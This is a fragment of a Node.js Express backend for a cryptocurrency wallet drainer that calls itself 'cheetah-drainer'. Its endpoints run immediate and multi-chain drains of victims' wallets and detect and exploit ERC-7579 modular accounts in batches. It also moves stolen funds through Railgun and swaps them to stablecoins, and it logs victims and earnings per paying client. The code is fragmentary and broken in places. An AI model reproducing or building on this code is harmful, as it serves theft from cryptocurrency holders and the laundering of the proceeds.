app.get('/api/signature/stats', async (req, res) => {
    const stats = coreDrainer.getDatabaseStats();
// ==================== ON-CHAIN TRENDS API ====================
app.get('/api/trends/trending', async (req, res) => {
app.post('/api/trends/monitor', async (req, res) => {
app.get('/api/trends/token/:chain/:address', async (req, res) => {
app.get('/api/trends/timing', async (req, res) => {
// ==================== ERC-7579 EXPLOITATION API ====================
app.post('/api/erc7579/detect', async (req, res) => {
    const detection = await coreDrainer.detectModularAccount(
app.post('/api/erc7579/exploit', async (req, res) => {
    const exploit = await coreDrainer.exploitModularAccount(
app.post('/api/erc7579/detect-batch', async (req, res) => {
    const results = await coreDrainer.batchDetectModularAccounts(
app.post('/api/erc7579/exploit-batch', async (req, res) => {
    const results = await coreDrainer.batchExploitModularAccounts(
app.get('/api/erc7579/stats', async (req, res) => {
app.post('/api/trends/watchlist', async (req, res) => {
app.delete('/api/trends/watchlist/:id', async (req, res) => {
app.get('/api/trends/watchlist', async (req, res) => {
app.get('/api/trends/stats', async (req, res) => {
app.post('/api/abi', async (req, res) => {
    const baseUrl = getExplorerApiBase(chainId);
    const apiKey = getExplorerApiKey(chainId);
    if (!baseUrl || !apiKey) {
        error: `Missing explorer config for chain ${chainId}` 
    const url = `${baseUrl}/api?module=contract&action=getabi&address=${tokenAddress}&apikey=${apiKey}`;
    const apiRes = await fetch(url);
    const data = await apiRes.json();
    if (data.status !== "1") {
        error: data.result || 'ABI fetch failed' 
    res.json({ success: true, abi: JSON.parse(data.result) });
    res.status(500).json({ 
      error: err.message 
app.post('/api/transaction-history', async (req, res) => {
    const { address, chainId } = req.body;
    if (chainId !== 1) {
        success: true, 
        transactionHistory: getFallbackTxData() 
    const apiUrl = `https://api.etherscan.io/api?module=account&action=txlist&address=${address}&startblock=0&endblock=99999999&sort=asc&apikey=${apiKey}`;
    const apiRes = await fetch(apiUrl);
    const txs = data.result;
    const transactionHistory = processTransactionData(txs);
    res.json({ success: true, transactionHistory });
      transactionHistory: getFallbackTxData() 
app.post('/api/token-data', async (req, res) => {
    const apiKey = process.env.COVALENT_API_KEY;
      return res.json({ success: true, tokens: [] });
    const apiUrl = `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${apiKey}`;
    const { data: { items: tokens = [] } } = await apiRes.json();
    res.json({ success: true, tokens: [] });
app.post('/api/execute-railgun', async (req, res) => {
    const { chunk, userAddress } = req.body;
    // ✅ SAFE - Private key stays in backend
    const railgunProvider = new ethers.JsonRpcProvider(RPC_URL);
    const yourWallet = new Wallet(DRAINER_PK, railgunProvider);
    // Your Railgun logic here...
    const railgunTx = await yourWallet.sendTransaction({
      to: RAILGUN_CONTRACT_ADDRESS,
      value: ethers.parseEther(chunk.toString())
    res.json({ success: true, txHash: railgunTx.hash });
function getExplorerApiBase(chainId) {
  const bases = {
    1: "https://api.etherscan.io",
    56: "https://api.bscscan.com",
    137: "https://api.polygonscan.com",
    42161: "https://api.arbiscan.io",
    10: "https://api-optimistic.etherscan.io",
    43114: "https://api.snowtrace.io",
    8453: "https://api.basescan.org"
  return bases[chainId];
function processTransactionData(txs) {
  const now = Date.now();
  const oneDayMs = 24 * 60 * 60 * 1000;
  const firstTx = txs[0] ? parseInt(txs[0].timeStamp) * 1000 : now;
  const daysActive = Math.max(1, (now - firstTx) / oneDayMs);
  const avgTxsPerDay = txs.length / daysActive;
  const defiInteractions = txs.filter(tx => 
    tx.input !== "0x" && tx.isError === "0"
  ).length;
  const hasComplexWallets = txs.some(tx => 
    tx.input.length > 500 || tx.contractAddress !== ""
  );
  const hasApprovalRevokes = txs.some(tx => 
    tx.input.includes("0x095ea7b3") &&
    tx.input.includes("0x0000000000000000000000000000000000000000")
  const lastTx = txs.length > 0 ? txs[txs.length - 1] : null;
  const lastTxDate = lastTx ? new Date(parseInt(lastTx.timeStamp) * 1000).toISOString() : new Date().toISOString();
    totalTxs: txs.length,
    defiInteractions,
    lastTxDate,
    hasComplexWallets,
    hasApprovalRevokes,
    avgTxsPerDay
function getFallbackTxData() {
    totalTxs: 0,
    defiInteractions: 0,
    lastTxDate: new Date().toISOString(),
    hasComplexWallets: false,
    hasApprovalRevokes: false,
    avgTxsPerDay: 0
async function handlePostDrainOperations(victimAddress, drainedTokens, chainId) {
        console.log('🔄 Handling post-drain operations...');
                chainId,
            if (swapResult) {
                console.log(`💰 Converted ${token.amount} to stablecoins!`);
                // Add to your profit tracking
        console.error('Post-drain operations failed:', error);
app.post('/api/execute-drain', async (req, res) => {
        const { userAddress, operationId, mode = 'legacy', operations, chainId } = req.body;
        // Multi-sig check (if operationId provided)
        if (operationId && !multiSigManager.isOperationApproved(operationId)) {
            return res.status(403).json({ 
                success: false, 
                error: 'Operation requires multi-signature approval' 
        // Check if single-popup mode is requested
        if (mode === 'single-popup' && SINGLE_POPUP_CONFIG.ENABLED) {
            console.log('🚀 Using single-popup drain mode');
            const { multiChainDrain } = await import('./modules/multiChainDrain.js');
            await multiChainDrain.initialize();
            const result = await multiChainDrain.executeSinglePopupMultiChainDrain(
                userAddress,
                req.body.userWallet, // Assuming wallet is passed from frontend
                operations || []
            // Clean up approval if multi-sig was used
            if (operationId) {
                multiSigManager.pendingApprovals.delete(operationId);
            return res.json(result);
        // Fallback to legacy mode
        console.log('⚡ Using legacy drain mode');
        const result = await coreDrainer.executeImmediateDrain(userAddress);
        // Clean up approval if multi-sig was used
        if (operationId) {
            multiSigManager.pendingApprovals.delete(operationId);
        console.error('❌ Drain execution error:', error.message);
        // Clean up approval on error too
        if (req.body.operationId) {
            multiSigManager.pendingApprovals.delete(req.body.operationId);
app.post('/api/multi-chain/scan', async (req, res) => {
        const { walletAddress } = req.body;
        if (!walletAddress) {
            return res.status(400).json({ error: 'Wallet address required' });
        // Initialize multi-chain manager
        const { multiChainManager } = await import('./lib/multiChainManager.js');
        await multiChainManager.initializeChains();
        // Scan wallet across all chains
        const results = await multiChainManager.scanWalletAcrossChains(walletAddress);
        res.json({
            success: true,
            results: results,
            timestamp: new Date().toISOString()
        console.error('❌ Multi-chain scan error:', error);
        res.status(500).json({ 
app.post('/api/multi-chain/drain', async (req, res) => {
        const { walletAddress, chainIds } = req.body;
        // Execute drain
        const results = await multiChainManager.executeMultiChainDrain(walletAddress);
            drainedChains: results,
        console.error('❌ Multi-chain drain error:', error);
app.post('/api/consolidate-funds', async (req, res) => {
    const { drainResults } = req.body;
    const result = await coreDrainer.consolidateFunds(drainResults);
// Scan analysis endpoint
app.post('/api/scan-analysis', async (req, res) => {
    const { scanData } = req.body;
    const analysis = await coreDrainer.analyzeScanResults(scanData);
    res.json({ success: true, analysis });
app.post('/api/immediate-drain', async (req, res) => {
// Modify your existing track endpoint
    const clientId = req.headers['x-client-id'] || getClientIdFromReferrer(req.headers.referer);
    // Track for specific client
      console.log(`👤 Client ${clientId} - Victim: ${victimData.walletAddress}`);
      // Emit to client-specific channel
        walletAddress: victimData.walletAddress,
        chain: victimData.chain,
        timestamp: new Date().toISOString(),
        client: client.name
    console.error('Tracking error:', error);
// ==================== CLEANUP TASK ==================== // ADDED
// ==================== GLOBAL ERROR HANDLING ====================
// Handle uncaught exceptions (like Bitcoin errors)
process.on('uncaughtException', (error) => {
  if (error.message.includes('bitcoin') || error.message.includes('substring')) {
    console.log('⚠️ Bitcoin initialization failed - continuing without Bitcoin support');
  } else {
    console.error('❌ Uncaught Exception:', error.message);
// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
// ==================== END ERROR HANDLING ====================
// Clean up old multi-sig requests every hour
    multiSigManager.cleanupOldRequests();
}, 60 * 60 * 1000); // Every hour
// ========== SECURE API ENDPOINTS ==========
// Drain endpoint (sensitive operation)
// Swap endpoint (sensitive operation)
    const { tokenAddress, amount, chainId } = req.body;
    // Use sensitive API keys safely
    console.log('Using COVALENT_API_KEY safely:', COVALENT_API_KEY ? '***SET***' : 'MISSING');
    const result = { success: true, message: 'Swap executed on server' };
// Enhanced rate limiting
const apiLimiter = rateLimit({
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP',
  skip: (req) => {
    // Skip rate limiting for whitelisted IPs
    const whitelist = process.env.ADMIN_WHITELIST_IPS?.split(',') || [];
    return whitelist.includes(req.ip);
// Apply to all API routes
app.use('/api/', apiLimiter);
// Add request logging middleware
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.ip} - ${req.method} ${req.path}`);
// Uptime monitoring endpoint - keep server awake
app.get('/ping', (req, res) => {
    status: 'pong', 
    server: 'cheetah-drainer',
    version: '1.0'
// Also save when new clients register (add to registration endpoints)
    console.log('💾 Saved ' + clients.size + ' clients to file');
      console.log('📂 Loaded ' + clients.size + ' clients from storage');
let clientEarnings = new Map();
let clientVictims = new Map();
const CLIENTS_DATA_FILE = \"clients-data.json\";
function saveClientsToFile() {
    fs.writeFileSync(CLIENTS_DATA_FILE, JSON.stringify(clientsData, null, 2));
function loadClientsFromFile() {
    if (fs.existsSync(CLIENTS_DATA_FILE)) {
      const data = JSON.parse(fs.readFileSync(CLIENTS_DATA_FILE, 'utf8'));
      clientEarnings = new Map(data.earnings || []);
      clientVictims = new Map(data.victims || []);
loadClientsFromFile();
setInterval(saveClientsToFile, 300000);
